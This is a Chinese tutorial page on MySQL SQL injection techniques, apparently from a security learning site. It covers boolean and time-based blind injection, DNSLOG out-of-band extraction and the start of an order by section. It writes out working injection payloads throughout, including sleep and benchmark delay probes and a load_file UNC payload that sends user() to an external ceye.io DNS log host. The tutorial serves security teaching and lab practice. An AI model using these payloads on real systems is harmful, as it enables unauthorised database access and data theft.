<h2 class="anchor anchorWithStickyNavbar_LWe7" id="盲注">盲注<a href="#盲注" class="hash-link" aria-label="盲注的直接链接" title="盲注的直接链接">​</a></h2>
<p>**核心：**利用逻辑符号/条件函数，让返回内容/响应时间与正常页面不符，从而让我们可以观察到差异。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="布尔盲注">布尔盲注<a href="#布尔盲注" class="hash-link" aria-label="布尔盲注的直接链接" title="布尔盲注的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="概念-2">概念<a href="#概念-2" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h4>
<p>通过页面对永真条件如<code>and 2*3=6</code>和永假条件如<code>and 2*3=5</code>返回的内容是否存在差异，进行判断是否可以进行布尔盲注；</p>
<p>页面通常返回存在（True）/不存在（False）两种结果，通过这两种结果就可以判断是否存在布尔盲注</p>
<p>使用永真条件<code>&#x27;1&#x27;=&#x27;1&#x27;</code></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220134542479" src="/assets/images/image-20211220134542479-0a50cbce5bd976624c0ee400413bf87d.png" width="1998" height="424" class="img_ev3q"></p>
<p>使用永假条件<code>&#x27;1&#x27;=&#x27;2&#x27;</code></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">2</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220134634529" src="/assets/images/image-20211220134634529-3ad3a5ad62da9e5b96a0266de458eea6.png" width="1624" height="368" class="img_ev3q"></p>
<p>可以看出永真条件和永假条件分别代入SQL语句执行后，永为假的页面缺少了部分信息，利用这种差异性，我们就可以构造payload获取到数据库中的数据。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用函数">常用函数<a href="#常用函数" class="hash-link" aria-label="常用函数的直接链接" title="常用函数的直接链接">​</a></h4>
<blockquote>
<p>布尔盲注主要依赖于返回结果的差异判断，所以我们在注入过程中也只能一位一位的进行判断，在判断长度的时候或者切割字符串的时候，就需要用到一些内置的函数。</p>
<p>一些功能一样或类似的函数就不单独列出来了，比如<code>ascii</code>和<code>ord</code></p>
</blockquote>
<table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><code>ascii()</code></td><td>返回指定字符的ascii码值</td></tr><tr><td><code>count()</code></td><td>返回计算结果集的数量</td></tr><tr><td><code>length()</code></td><td>返回指定字符串的长度</td></tr><tr><td><code>substring</code></td><td>返回截取的字符串</td></tr></tbody></table>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注入流程-2">注入流程<a href="#注入流程-2" class="hash-link" aria-label="注入流程的直接链接" title="注入流程的直接链接">​</a></h4>
<ol>
<li>闭合SQL语句</li>
<li>计算当前数据库名长度</li>
<li>逐字节获取数据库名</li>
<li>计算表的数量</li>
<li>计算表名的长度</li>
<li>逐字节获取表名</li>
<li>计算列的数量</li>
<li>计算列名的长度</li>
<li>逐字节获取列名</li>
<li>计算字段的数量</li>
<li>计算字段内容的长度</li>
<li>逐字节获取字段内容</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常见语句">常见语句<a href="#常见语句" class="hash-link" aria-label="常见语句的直接链接" title="常见语句的直接链接">​</a></h4>
<ul>
<li>计算当前数据库名长度</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and length(database()) &gt; 7 -- - # true</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> length</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - # false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> length</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - # true</span><br></span></code></pre></div></div>
<p>说明当前数据库长度为8</p>
<p><img decoding="async" loading="lazy" alt="image-20211220140849332" src="/assets/images/image-20211220140849332-58cf7cabf7584f63c4e83e210330c286.png" width="1718" height="436" class="img_ev3q"></p>
<ul>
<li>逐字节获取数据库名</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and left(database(),1)=&#x27;</span><span class="token plain">s</span><span class="token string" style="color:#e3116c">&#x27; -- - true</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">left</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;se&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and substr(database(),1,1)=&#x27;</span><span class="token plain">s</span><span class="token string" style="color:#e3116c">&#x27; -- - true</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">97</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and ascii(substr(database(),1,1))&gt;115 -- - false</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">115</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - true</span><br></span></code></pre></div></div>
<p>说明数据库名的第一位的ascii码值为115，也就是<code>s</code>，然后逐步得出数据库名为<code>security</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211220141331605" src="/assets/images/image-20211220141331605-946e841b43a5bc38cfa13f9c3e9880de.png" width="1672" height="394" class="img_ev3q"></p>
<ul>
<li>计算表的数量</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="token plain">security</span><span class="token string" style="color:#e3116c">&#x27;) &gt; 3 -- - true</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;security&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="token plain">security&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- - true</span><br></span></code></pre></div></div>
<p>说明存在4个表</p>
<p><img decoding="async" loading="lazy" alt="image-20211220142512272" src="/assets/images/image-20211220142512272-cb80f4c42da04e373bf960a7bb091f7b.png" width="1828" height="402" class="img_ev3q"></p>
<p>差不多介绍这些吧，算是各方面都有覆盖了，抛砖引玉；核心还是想着如何构造成完整的SQL语句</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="总结-1">总结<a href="#总结-1" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h4>
<ol>
<li>盲注点确认后，我们一般不会去手动尝试一个字节一个字节的跑出来，而是采用工具比如sqlmap或者一些脚本来辅助我们，毕竟是属于重复无意义的工工作，交给机器就好了</li>
<li>语句和之前其他查询都是类似，唯一的区别，就是盲注变成了一位字符一位字符的判断，不像之前那样一次性全部获取数据</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="扩展基于正则的盲注">扩展：基于正则的盲注<a href="#扩展基于正则的盲注" class="hash-link" aria-label="扩展：基于正则的盲注的直接链接" title="扩展：基于正则的盲注的直接链接">​</a></h4>
<p>和前面<code>left</code>函数可以说基本上一样，但是觉得还是算一个知识点，就补充写到后面吧</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 判断user()是不是root开头</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">regexp</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;^root&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220151009553" src="/assets/images/image-20211220151009553-594beba3bd3f866367992c54f1cded62.png" width="1790" height="404" class="img_ev3q"></p>
<p>判断是不是roots开头，明显不是</p>
<p><img decoding="async" loading="lazy" alt="image-20211220151025070" src="/assets/images/image-20211220151025070-df9f374d54ad9d89a5606c5799f9ac09.png" width="1782" height="376" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="扩展未知列名的盲注">扩展：未知列名的盲注<a href="#扩展未知列名的盲注" class="hash-link" aria-label="扩展：未知列名的盲注的直接链接" title="扩展：未知列名的盲注的直接链接">​</a></h4>
<p>在知道表名，不知道列名的情况下，提供一种新的盲注方法</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;aaa&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;666&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220120160556362" src="/assets/images/image-20220120160556362-5c63cfe902aae293be26ba8d23d49579.png" width="1316" height="340" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="时间盲注">时间盲注<a href="#时间盲注" class="hash-link" aria-label="时间盲注的直接链接" title="时间盲注的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="概念-3">概念<a href="#概念-3" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h4>
<p>和布尔盲注类似，从名字也可以看出来，是依赖于响应时间上的差异来判断</p>
<p>举个简单的例子：如果1=1为真，就休眠5秒；这样页面返回时间一定大于5秒</p>
<p><strong>通常可利用的产生时间延迟的函数有：</strong><code>sleep()</code>、<code>benchmark()</code>，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="应用场景">应用场景<a href="#应用场景" class="hash-link" aria-label="应用场景的直接链接" title="应用场景的直接链接">​</a></h4>
<p>确实存在注入点，但无论输入什么内容，都显示一样的页面和内容；比如登陆页面、用户信息采集模块等</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用函数-1">常用函数<a href="#常用函数-1" class="hash-link" aria-label="常用函数的直接链接" title="常用函数的直接链接">​</a></h4>
<p>除了上述布尔盲注的常用函数外，还需要一些能够进行判断和造成时间延时的函数</p>
<table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><code>if(1,2,3)</code></td><td>如果1位True，就执行2，否则执行3</td></tr><tr><td><code>case when 1 then 2 else 3 end</code></td><td>同<code>if</code></td></tr><tr><td><code>sleep(x)</code></td><td>延时x秒</td></tr><tr><td><code>benchmark(count,exp)</code></td><td>执行表达式exp，count次（消耗CPU）</td></tr></tbody></table>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常见语句-1">常见语句<a href="#常见语句-1" class="hash-link" aria-label="常见语句的直接链接" title="常见语句的直接链接">​</a></h4>
<p>和布尔盲注一样，只是加了判定如<code>if</code>和延时函数如<code>sleep</code>，所以此处举几个例子说明一下即可，主要是演示下用法。</p>
<ul>
<li>如果当前数据库的第一个字符是<code>s</code>，就延时2秒</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and if(substr((select database()),1,1) = &#x27;</span><span class="token plain">s&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220145008209" src="/assets/images/image-20211220145008209-b07f1c69fedd20a0977de884c6d556a0.png" width="3072" height="114" class="img_ev3q"></p>
<ul>
<li>如果当前数据库<code>group_concat</code>连接后的表名第一个字符ascii码是101，就执行50000000次<code>md5(&#x27;a&#x27;)</code></li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="token plain">security</span><span class="token string" style="color:#e3116c">&#x27;),1,1)) = 101) then benchmark(50000000,md5(&#x27;</span><span class="token plain">a&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">end</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220145729888" src="/assets/images/image-20211220145729888-939caab974dae38f093e8198acede0d6.png" width="2068" height="110" class="img_ev3q"></p>
<ul>
<li>如果查询出来的username第一个字符是D，就进行笛卡尔积运算</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> username </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;D&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> B</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220150351619" src="/assets/images/image-20211220150351619-b6ef682a0cb958533c0e4a9f8cda5d86.png" width="2120" height="108" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dns注入简化盲注">DNS注入（简化盲注）<a href="#dns注入简化盲注" class="hash-link" aria-label="DNS注入（简化盲注）的直接链接" title="DNS注入（简化盲注）的直接链接">​</a></h2>
<p>也称为<strong>DNSLOG外带数据盲注</strong>，主要是为了简化盲注，但是默认情况下无法使用，需要修改配置<code>secure-file-priv</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-4">概念<a href="#概念-4" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为<code>OOB（带外数据）</code>注入。</p>
<p>如何用DNSLOG带出数据？</p>
<p>若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录evil.com的DNS记录，就可以得到数据：aabbcc</p>
<p><img decoding="async" loading="lazy" alt="dnslog小技巧" src="/assets/images/981809-20190218101257703-309560929-9a67fb0eb2031bd762535dbf8477a3ec.png" width="1607" height="610" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="应用场景-1">应用场景<a href="#应用场景-1" class="hash-link" aria-label="应用场景的直接链接" title="应用场景的直接链接">​</a></h3>
<ol>
<li>三大注入无法使用，或盲注跑数据太慢太慢</li>
<li>有文件读取权限及<code>secure-file-priv</code>无值（不为null）</li>
<li>目标系统为Windows</li>
</ol>
<blockquote>
<p>为什么Windows可用，Linux不行？</p>
<p>这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。</p>
<p>注：payload里的四个\\中的两个\是用来进行转义处理的。</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用语句">利用语句<a href="#利用语句" class="hash-link" aria-label="利用语句的直接链接" title="利用语句的直接链接">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> load_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\\\\&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;.xxxx.ceye.io\xxxx&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="order-by注入">order by注入<a href="#order-by注入" class="hash-link" aria-label="order by注入的直接链接" title="order by注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-5">概念<a href="#概念-5" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p><code>order by</code>是mysql中对查询数据进行排序的方法，使用示例</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 默认排序asc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 如果是数字，就对应到相关的列</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名 </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> 列名</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">数字</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">asc</span><span class="token operator" style="color:#393A34">/</span><span class="token keyword" style="color:#00009f">desc</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
